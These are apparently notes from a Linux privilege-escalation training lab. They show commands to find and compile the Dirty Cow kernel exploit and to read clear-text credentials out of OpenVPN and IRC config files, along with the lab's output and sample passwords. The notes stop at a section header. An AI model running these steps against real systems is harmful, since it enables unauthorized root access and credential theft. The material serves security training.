# Linux PrivEsc Arena

Connect : `ssh -o HostKeyAlgorithms=+ssh-rsa TCM@10.48.133.217`

### 1. Privilege Escalation - Kernel Exploits

```
uname -r

cat /proc/version

Use linux-exploit-suggester.sh

Found Dirty Cow

Use Exploit (gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w && ./c0w)

In command prompt type: passwd
In command prompt type: id
```

### 2. Privilege Escalation - Stored Passwords (Config Files)

```
QUESTIONS:
1. In command prompt type: cat /home/user/myvpn.ovpn
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: cat /etc/openvpn/auth.txt
4. From the output, make note of the clear-text credentials.
5. In command prompt type: cat /home/user/.irssi/config | grep -i passw
6. From the output, make note of the clear-text credentials.

-----------------------------------------------------------------------------

TCM@debian:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
TCM@debian:~$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
```

### 4. Privilege Escalation - Stored Passwords (History)

```
